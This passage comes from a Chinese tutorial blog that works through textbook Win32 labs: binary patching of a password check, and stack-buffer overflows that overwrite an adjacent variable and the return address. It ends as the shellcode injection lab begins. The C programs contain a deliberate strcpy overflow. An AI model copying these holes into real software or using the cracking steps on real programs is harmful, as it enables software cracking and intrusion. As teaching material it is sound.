<li><strong>恢复栈帧</strong>：弹出当前栈帧，恢复上一个栈帧。具体包括：<ul>
<li>在堆栈平衡的基础上，给 ESP 加上栈帧的大小，抬高栈顶（地址变大），回收当前栈帧的空间。将当前栈帧底部保存的前栈帧 EBP 值弹入<mark class="label success">EBP</mark>寄存器，恢复出上一个栈帧。</li>
<li>将函数返回地址弹给<mark class="label warning">EIP</mark>寄存器。</li>
</ul>
</li>
<li><strong>跳转</strong>：按照函数返回地址跳回母函数（调用函数）中继续执行。</li>
</ol>
</div>

<p>以 C 语言和 Win32 平台为例，函数返回时的相关的指令序列如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add esp,XXX   ;降低栈顶，回收当前的栈帧。此时栈顶元素是被保存的旧ebp的值，esp指向栈顶的旧ebp的值</span><br><span class="line">pop ebp		;将上一个栈帧底部位置恢复到ebp，pop指令弹出的是栈顶元素！！弹出栈顶元素到寄存器ebp，</span><br><span class="line">  		;此时该栈被清空。esp指向返回地址。</span><br><span class="line">retn		;a) 弹出当前栈顶元素，即弹出栈帧中的返回地址。至此，栈帧恢复工作完成。</span><br><span class="line">  		;b）让处理器跳转到弹出的返回地址，恢复调用前的代码区。</span><br></pre></td></tr></table></figure>

<p>函数调用与函数返回的的过程图如下。</p>
<p><img data-src="https://i.loli.net/2021/04/26/3stdAIYeh4cQLli.png" alt="1-8.png"></p>
<h3 id="2-3-爆破（修改跳转逻辑）"><a href="#2-3-爆破（修改跳转逻辑）" class="headerlink" title="2.3 爆破（修改跳转逻辑）"></a>2.3 爆破（修改跳转逻辑）</h3><p>程序源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> authenticated;</span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please inpute password:    &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        valid_flag = verify_password(password);</span><br><span class="line">        <span class="keyword">if</span>(valid_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;congratulations!! You have passed the varification!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<div class="note danger"><p><strong>源代码分析</strong>：分析<code>main</code>函数，有两个判断分支，只有当输入的<code>password</code>等于<code>1234567</code>时密码正确才能通过验证，跳出循环。</p>
<p><strong>破解思路</strong>：修改跳转逻辑，即使输入错误的密码，也将通过验证。</p>
<p><strong>使用工具</strong>：IDA Pro、OllyDbg、LordPE、UltraEdit。</p>
</div>

<ol>
<li>将编译过后的<code>.exe</code>文件拖入到 IDA 中，先根据函数流程图判断分支，然后定位到发生跳转的点（即爆破点）；</li>
<li>可以看到这条指令定位在<code>.text</code>节，并且 IDA 已经自动将该条指令的地址换算成了运行时的内存地址 VA：<code>0x0040106E</code>。接着使用 OllyDbg 打开该 PE 文件，并搜素（Ctrl+G）地址<code>0x0040106E</code>定位到该指令。</li>
</ol>
<p><img data-src="https://i.loli.net/2021/04/26/vyCcsSl5Tm8fwHp.png" alt="1-9.png"><br><img data-src="https://i.loli.net/2021/04/26/NOmYSBVEWlK5bHj.png" alt="1-10.png"><br><img data-src="https://i.loli.net/2021/04/26/wcJzmiWSb9EZ4lL.png" alt="1-11.png"></p>
<div class="note info"><p>OllyDbg 在默认情况下将程序中断在 PE <strong>装载器开始处</strong>，而不是<code>main</code>函数的开始。可以按 F8 键单步跟踪，看看在<code>main</code>函数被运行之前，装载器都做了哪些准备工作。一般情况下， <code>main</code>函数位于<code>GetCommandL ineA</code>函数调用后不远处，并且有明显的特征：<mark class="label success">mian函数在调用之前有3次连续的压栈操作，因为系统要给main传入默认的argc、argv等参数</mark>。找到main函数调用后，按F7键单步跟入就可以看到真正的代码了。</p>
</div>

<p><img data-src="https://i.loli.net/2021/04/26/gMxnQvjiTzDNVk7.png" alt="1-12.png"></p>
<ol start="3">
<li>选中这条指令，按<code>F2</code>键下断点，成功后，指令的地址会被标记成不同颜色。</li>
<li>按<code>F9</code>键让程序运行起来，这时候控制权会回到程序，OllyDbg 暂时挂起。到程序提示输入密码的 Console界面随便输入一个错误的密码，回车确认后，OllyDbg会重新中断程序，收回控制权。</li>
<li>分析<code>0x0040106C</code>和<code>0x0040106E</code>处的代码：<code>TEST EAX,EAX</code>，<code>JE XXXXXXXX</code>。也就是说，EAX 中的值为 0 时，跳转将被执行，程序进入密码确认流程；否则跳转不执行，程序进入密码重输的流程。</li>
<li>两种破解修改方法：<ul>
<li><mark class="label warning">把 JE 这条指令的机器代码修改成 JNE（非 0 则跳转）</mark>，那么整个程序的逻辑就会反过来：输入错误的密码会被确认，输入正确的密码反而要求重新输入!（双击JE这条指令，将其修改成 JNE，单击“Assemble"按钮将其写入内存如图 1.4.9 所示）OllyDbg 将汇编指令翻译成机器代码后写入内存。原来内存中的机器代码74 （JE）现在变 成了75 （JNE）。 </li>
<li><mark class="label default">把 TEST EAX ,EAX 指令修改成 XOR EAX,EAX</mark> 也能达到改变程序流程的目的，这时不论正确与否，密码都将被接受。</li>
</ul>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/04/26/faDQn8hysBVUwdN.png" alt="1（开始）.png"></p>
<ol start="7">
<li><p>将 PE 文件<mark class="label danger">硬编码</mark>。上面动态调试只是在内存中修改程序数据，当程序再一次打开的时候内存丢失则不会继续执行上述结果，所以还需要在二进制文件中也修改相应的字节。</p>
<ul>
<li><p>上面得到的是内存虚拟地址（VA）为<code>0x0040106E</code>，使用<mark class="label info">LordPE</mark> 打开<code>.exe    </code>文件，如图 1.4.10。按照 VA 与文件地址的换算公式：</p>
<p>$文件偏移地址 &#x3D; 虚拟内存地址(VA) - 装载基址(Image Base) - 节偏移$</p>
<p>$ &#x3D; 0x0040106E - 0x00400000 - (0x00001000 - 0x00001000) &#x3D; 0x106E$</p>
</li>
</ul>
</li>
<li><p>也就是说，这条指令在 PE 文件中位于距离文件开始处<code>106E</code> 字节的地方。用<mark class="label info">UltraEdit</mark> 按照二进制方式打开该<code>.exe </code>文件，如图1.4.11 所示。按快捷键 Ctrl+G，输入<code>0x106E</code>直接跳到 JE 指令的机器代码处，如图1.4.12所示。将这一个字节的 74 (JE) 修改成 75 (JNE)，保存后重新运行可执行文件，原本正确的密码<code>1234567</code>现在反而提示错误了。</p>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/04/26/o1AqzlrJ9Mxp2s8.png" alt="2.png"><br><img data-src="https://i.loli.net/2021/04/26/dSbPayni8DeFmNH.png" alt="3.png"></p>
<h3 id="2-4-修改领接变量（返回值）"><a href="#2-4-修改领接变量（返回值）" class="headerlink" title="2.4 修改领接变量（返回值）"></a>2.4 修改领接变量（返回值）</h3><p>函数的局部变量在栈中一个挨着一个排列，如果这些局部变量中有数组之类的缓冲区，并且程序中存在数组越界的缺陷，那么越界的数组元素就有可能<strong>破坏栈中相邻变量的值</strong>，甚至破坏栈帧中所保存的 <strong>EBP</strong> 值、<strong>返回地址</strong>等重要数据。</p>
<div class="note success"><p>大多数情况下，局部变量在栈中的分布是相邻的，但也有可能出于编译优化等需要而有所例外。</p>
</div>

<p>程序源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> authenticated;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];<span class="comment">//add local buffer to be overflowed</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please inpute password:    &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        valid_flag = verify_password(password);</span><br><span class="line">        <span class="keyword">if</span>(valid_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;congratulations!! You have passed the varification!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<div class="note danger"><p><strong>源码分析</strong>：<code>verify_password</code>函数中的<code>strcpy(buffer,password)</code>直接将<code>password</code>复制给了<code>buffer</code>，没有经过过滤处理，且<code>buffer</code>在内存的栈中，故可以操作内存修改栈中数据。</p>
<p><strong>破解思路</strong>：修改栈数据，使得返回值<code>authenticated</code>等于 0，绕过验证。</p>
</div>

<blockquote>
<p>相对 Crack 实验的修改</p>
<ul>
<li>verify_ password 函数中的局部变量 char buffer[8] 的声明位置。</li>
<li>字符串比较之后的 strcpy(buffer,password)。</li>
</ul>
<p>这两处修改实际上对程序的密码验证功能并没有额外作用，这里加上它们只是为了人为制造一个栈溢出漏洞。</p>
</blockquote>
<div class="note success"><p><mark class="label primary">如果我们输入的密码超过了7个字符（注意：字符串截断符NULL将占用一个字节），则越界字符的ASCII码会修改掉authenticated的值。</mark><mark class="label danger">如果这段溢出数据恰好把authenticated改为 0，则程序流程将被改变。</mark></p>
</div>

<p>图 2.2.1 是<code>verify_ password</code>函数运行时的函数栈。</p>
<p>（1）可以看到，在<code>verify_ password</code>函数的栈帧中，局部变量<code>int authenticated</code>恰好位于缓冲区<code>char buffer[8]</code>的“下方”。</p>
<p>（2）<code>authenticated</code>为<code>int</code>类型，在内存中是一个 DWORD，占 4 个字节。所以，如果能够让<code>buffer</code>数组越界，<code>buffer[8]</code>、<code> buffer[9]</code>、<code>buffer[10]</code>、<code>buffer[11]</code>将写入相邻的变量<code>authenticated</code>中。</p>
<p>（3）观察一下源代码不难发现，<code>authenticated</code>变量的值来源于<code>strcmp</code>函数的返回值，之后会返回给<code>main</code>函数作为密码验证成功与否的标志变量：当<code>authenticated</code>为 0 时，表示验证成功；反之，验证不成功。</p>
<p><img data-src="https://i.loli.net/2021/04/26/BHf7rFqxaKNb1AT.png" alt="8.png"></p>
<ol>
<li>假如输入的密码为7个英文字母<code>q</code>，按照字符串的序关系<code>qqqqqq&gt;1234567</code>， strcmp 应该返回 1，即authenticated 为 1。OllyDbg 动态调试的实际内存情况如图 2.2.3 所示，栈帧分布情况如表2-2-2。</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/01/ZTybn8UFNlBdX5H.png" alt="9.png"></p>
<p><img data-src="https://i.loli.net/2021/02/01/dYMc4Uhrs6IR8Wu.png" alt="10.png"></p>
<div class="note default"><span id="sj">
<mark class="label danger">内存数据</mark><mark class="label info">数值数据</mark><mark class="label default">小端序</mark>

<p>在观察内存的时候应当注意<mark class="label danger">内存数据</mark> 与 <mark class="label info">数值数据</mark> 的区别。在我们的调试环境中，内存由低到高分布，Win32 系统在内存中由低位向高位存储一个 4 字节的双字（DWORD），但在作为“数值”应用的时候，却是按照由高位字节向低位字节进行解释。这样一来，在我们的调试环境中，“内存数据”中的 DWORD 和我们逻辑上使用的“数值数据”是<mark class="label default">按每个字节（8位）序逆序</mark>过的。</p>
<p>例如，变量 authenticated 在内存中存储为<code>0x01 00 10 00</code>，这个“内存数据”的双字会被计算机由高位向低位按字节解释成“数值数据”<code>0x00 10 00 01</code>。出于便于阅读的目的，OllyDbg 在栈区显示的时候已经将内存中双字的字节序反转了，也就是说，<strong>栈区栏显示的是“数值数据”，而不是原始的“内存数据”</strong>（ <mark class="label warning">栈区栏按照数值数据显示</mark> ），所以，在栈内看数据时，从左向右读数据时对于 32 位系统地址的偏移量依次为0、 1、2、3。</p>
<p>小端序：<mark class="label danger">数值数据的高字节存放于内存数据的低字节</mark>，如<code>00rst  </code>--&gt; （对应ASCII码）<code>00 72 73 74</code>--&gt;（存于内存中时）<code>74 73 72 00</code>。其实就是一个入栈原理，如数值数据<code>00 72 73 74</code>，<code>74</code>数值低位先入栈，相应的也就存于栈的高地址，<code>73</code>位于栈的次高地址，所以在内存中也就变成了<code>74 73 72 00</code>。</p>
</div>
</span>

<p>【<a href="https://directoree.top/post/cssapp_notes/#duanxu">大端序小端序</a>】</p>
<ol start="2">
<li><p>下面试试输入超过 7 个字符，看看超过<code>buffer[8]</code>边界的数据能不能写进<code>authenticated</code>变量的数据区。为了便于区分溢出的数据，这次我们输入的密码为<code>qqqqqqqqrst</code>（8个q，‘q’、’r’、 ‘s’、‘t’ 的ASCII码相差1），结果如图 2.2.4 所示。</p>
<p>栈中的情况和我们分析的一样，从输入的第 9 个字符开始，将依次写入<code>authenticated</code>变量。 按照我们的输入<code>qqqqqqqqrst</code>，最终<code>authenticated</code>的值应该是字符<code>r</code>、 <code>s</code>、<code>t</code>和用于截断字符串的<code>null</code>所对应的 ASCII 码<code>0x00747372</code>。这时的栈帧数据如表 2-2-3 所示。</p>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/01/Rv84mWQh6LgErsB.png" alt="11.png"></p>
<p><img data-src="https://i.loli.net/2021/02/01/kRziayTYu2ASvFU.png" alt="屏幕快照 2021-02-01 下午6.22.08.png"></p>
<ol start="3">
<li>如下图</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/01/HtGmEO5ZWAahxTP.png" alt="屏幕快照 2021-02-01 下午6.24.23.png"></p>
<p><img data-src="https://i.loli.net/2021/02/01/osg3aCjOVD6TASu.png" alt="屏幕快照 2021-02-01 下午6.27.56.png"></p>
<div class="note danger"><p><strong>严格说来，并不是任何 8 个字符的字符串都能冲破上述验证程序</strong>。</p>
<p>由代码中的<code>authenticated=strcmp(password,PASSWORD)</code>， 我们知道 authenticated 的值来源于字符串比较函数 strcmp 的返回值。按照字符串的序关系，当输入的字符串大于<code>1234567</code>时返回 1，这时 authenticated 在内存中的值为<code>0x00000001</code>，可以用字串的截断符 NULL 淹没 authenticated 的低位字节而突破验证；当输入字符串小于<code>1234567</code>时（例如，“0123” 等字符串），函数返回<code>-1</code>，这时 authenticated 在内存中的值按照双字<code>-1</code>的补码存放，为<code>0xFFFFFFF</code>，如果这时也输入 8 个字符的字符串，截断符淹没 authenticated 低字节后，其值变为<code>0xFFFFFF00</code>，所以这时是不能冲破验证程序的。</p>
</div>



<h3 id="2-5-修改函数返回地址"><a href="#2-5-修改函数返回地址" class="headerlink" title="2.5 修改函数返回地址"></a>2.5 修改函数返回地址</h3><p>上节实验改写邻接变量的方法是很有用的，但这种漏洞利用对代码环境的要求相对比较苛刻。更通用、更强大的攻击通过缓冲区溢出改写的目标往往不是某一个变量，而是瞄准栈帧最下方的 <mark class="label default">EBP</mark> 和  <mark class="label warning">函数返回地址</mark>等栈帧状态值。</p>
<p>回顾上节实验中输入7个<code>q</code>程序正常运行时的栈状态，如表2-3-1 所示。</p>
<p><img data-src="https://i.loli.net/2021/02/02/kuF4xLgPpJWilGy.png" alt="屏幕快照 2021-02-02 下午6.25.04.png"></p>
<div class="note info"><p>如果继续增加输入的字符，那么超出<code>buffer[8]</code>边界的字符将依次淹没<code>authenticated</code>、 前栈帧EBP、返回地址。也就是说，控制好字符串的长度就可以让字符串中相应位置字符的 ASCII 码覆盖掉这些栈帧状态值。</p>
</div>

<ol>
<li><p>输入19个<code>q</code>，第 9~12 个字符将 authenticated 冲刷为<code>0x71717171</code>；第 13~16 个字将前栈帧 EBP 冲刷为<code>0x71717171</code>；第 17~19 个字符连同 NULL 结束符将返回地址冲刷为<code>0x00717171</code>。</p>
<p>这里用 19 个字符作为输入，看看淹没返回地址会对程序产生什么影响。出于双字对齐的目的，我们输入的字符串按照<code>4321</code>为一个单元进行组织，最后输入的字符串为<code>4321432143214321432</code>，Ollydbg 运行状态如图2.3.2，栈的情况如表2-3-1所示。</p>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/02/YmFIlPAjuh2Wef4.png" alt="屏幕快照 2021-02-02 下午6.57.31.png"></p>
<p><img data-src="https://i.loli.net/2021/02/02/jqLI5Wsz4Q7eKJc.png" alt="17.png"></p>
<ol start="2">
<li><p>返回地址被字符 ASCII 码覆盖成了<code>0x00323334</code>，函数返回时的状态如图2.3.4所示。</p>
<p>我们可以从调试器中的显示看出计算机中发生的事件：</p>
<ol>
<li>函数返回时将返回地址装入EIP寄存器。</li>
<li>处理器按照EIP寄存器的地址<code>0x00323334</code>取指。</li>
<li>内存<code>0x00323334</code>处并没有合法的指令，处理器不知道该如何处理，报错。</li>
</ol>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/02/02/l4OkxICNd3ozUnL.png" alt="18.png"></p>
<div class="note warning"><p>由于<code>0x00323334</code>是一个无效的指令地址，所以处理器在取指的时候发生了错误使程序崩溃。但如果这里我们给出一个有效的指令地址，就可以让处理器跳转到任意指令区去执行（比如直接跳转到程序验证通过的部分），也就是说，我们可以 <mark class="label danger">通过淹没返回地址而控制程序的执行流程</mark> 。</p>
</div>

<h3 id="2-6-控制程序执行流程（修改返回地址）"><a href="#2-6-控制程序执行流程（修改返回地址）" class="headerlink" title="2.6 控制程序执行流程（修改返回地址）"></a>2.6 控制程序执行流程（修改返回地址）</h3><div class="note info"><p>用键盘输入字符的 ASCII 表示范围有限，很多值（如0x11、0x12等符号）无法直接用键盘输入，所以把实验的代码做了下改动，将程序的<strong>输入改由PE文件同目录下从文件读取出字符串</strong>。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">&quot;1234567&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> authenticated;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!!!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;rw+&quot;</span>)))        <span class="comment">//判断文件是否存在</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);        <span class="comment">//不存在则直接exit出程序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,password);        <span class="comment">//从password.txt读取字符串，参数为文件指针，读取类型等..</span></span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span>(valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verifycation!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<div class="note primary"><p>准备工作：</p>
<p>（1）要摸清楚栈中的状况，如函数地址距离缓冲区的偏移量等。</p>
<p>（2）要得到程序中密码验证通过的指令地址，以便程序直接跳去这个分支执行。</p>
<p>（3）要在<code>password.txt</code>文件的相应偏移处填上这个地址。</p>
<p>（4）<code>verify_password</code>函数返回后就会直接跳转到验证通过的正确分支去执行了。</p>
</div>

<ol>
<li><p>首先用 OllyDbg 加载得到可执行 PE 文件，如图2.3.5所示。</p>
<p><img data-src="https://i.loli.net/2021/02/03/YXHu37AVfhpd1m2.png" alt="19.png"></p>
</li>
<li><p>阅读图 2.3.5 中显示的反汇编代码，返回地址为<code>0x00401107</code>，在<code>0x0040110A</code>处将EAX中的函数返回值取出，在<code>0x0040110D</code>处与 0 比较，然后决定跳转到提示验证错误的分支或提示验证通过的分支。可以知道通过验证的程序分支的指令地址为<code>0x00401122</code>，如果把返回地址修改为<code>0x00401122</code>，则可以绕过程序验证，如图2.3.6。</p>
<p><img data-src="https://i.loli.net/2021/02/03/lmOjRX7MZAJNhoi.png" alt="20.png"></p>
</li>
<li><p>仍然出于字节对齐、容易辨认的目的，仍然将“4321”作为一个输入单元。<code>buffer[8]</code>共需要两个这样的单元。</p>
<ul>
<li>第3个输入单元将authenticated覆盖；</li>
<li>第4个输入单元将前栈帧EBP值覆盖；</li>
<li>第5个输入单元将返回地址覆盖。</li>
</ul>
<p>为了把第5个输入单元的 ASCII 码值<code>0x34333231</code>修改成验证通过分支的指令地址<code>0x00401122</code>，我们将借助十六进制编辑工具 UItraEdit 来完成(0x40、 0x11 等ASCII码对应的符号很难用键盘输入）。</p>
<ol>
<li><p>创建一个名为<code>password.txt</code>的文件，并用记事本打开，在其中写入5个“4321”后保存到与实验程序同名的目录下。</p>
</li>
<li><p>保存后用 UItraEdit 打开，将 UItraEdit 切换到十六进制。</p>
<p><img data-src="https://i.loli.net/2021/02/03/TgcZEVLkyzFSsGt.png" alt="21.png"></p>
<p>注意这里的数值数据和内存数据，使用<mark class="label warning">小端序</mark>。</p>
</li>
<li><p>切换回文本模式，保存为<code>password.txt</code>，用 OllyDbg 调试后，最终栈的状态如表2-3-4。</p>
<p><img data-src="https://i.loli.net/2021/02/03/9O4AnPFaxGiXDy3.png" alt="22.png"></p>
<p><img data-src="https://i.loli.net/2021/02/03/xAo2TadsfMQP7Vc.png" alt="23.png"></p>
</li>
</ol>
</li>
</ol>
<h3 id="2-7-执行Shellcode"><a href="#2-7-执行Shellcode" class="headerlink" title="2.7 执行Shellcode"></a>2.7 执行Shellcode</h3><p>本节将介绍通过栈溢出让进程执行<strong>输入数据中</strong>植入的代码。在上节实验中，我们让函数返回到<code>main</code>函数的验证通过分支的指令。试想一下，如果我们在<code>buffer</code>里包含我们自己想要执行的代码，然后通过返回地址让程序跳转到系统栈里执行，我们岂不是可以让进程去执行本来没有的代码，直接去做其他事情了!</p>
<div class="note warning"><p>如图2.4.1所示，在本节实验中，我们准备向<code>password.txt</code>文件里植入二进制的机器码，并用这段机器码来调用 Windows 的一个 API 函数<code>MessageBoxA</code>， 最终在桌面上弹出一个消息框并显示<code>failwest</code>字样。（即在输入的数据中包含shellcode，然后修改返回地址，使返回地址被修改为shellcode的起地址，<mark class="label danger">数组入栈是将全部数据压入，同时栈顶是数组的第一个元素</mark>。）</p>
</div>



<div class="note danger"><p>这里还应该注意的是正常情况下返回地址是指令<code>ADD ESP 4</code>对应的地址，<mark class="label warning">当函数返回时去从恢复栈的这条指令继续执行，然后是参数、局部变量、被压栈的寄存器、ebp，然后是上一个调用函数的返回地址</mark>。</p>
</div>

<p><img data-src="https://i.loli.net/2021/02/03/AiwuoPbBXIfOz3S.png" alt="24.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span>   <span class="comment">//用于调用LoadLibrary函数装在user32.dll用于植入MessageBosA</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">&quot;1234567&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> authenticated;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">44</span>];        <span class="comment">//机器码空间可能大于8因此方便演示，做了扩充</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!!!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);  <span class="comment">//调用MessageBoxA的需要</span></span><br><span class="line">    <span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span>(valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verifycation!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>实验目的</strong>：在<code>password.txt</code>文件中植入二进制的机器码，在<code>password.txt</code>攻击成功时，密码验证程序应该执行植入的代码，并在桌面上弹出一个消息框显示<code>failwest</code>字样。</p>
<div class="note default"><p>在动手之前需要完成的几项工作：</p>
<p>（1）分析并调试漏洞程序，获得淹没返回地址的偏移。</p>
<p>（2）获得<code>buffer</code>的起始地址，并将其写入<code>password.txt</code>的相应偏移处，用来冲刷返回地址。</p>
<p>（3）向<code>password.txt</code>中写入可执行的机器代码，用来调用 API 弹出一个消息框。</p>
</div>



<ol>
<li><p>本节验证程序里<code>verify_password</code>中的缓冲区为44个字节，按照前边实验中对栈结构的分析，我们不难得出栈帧中的状态。</p>
<ul>
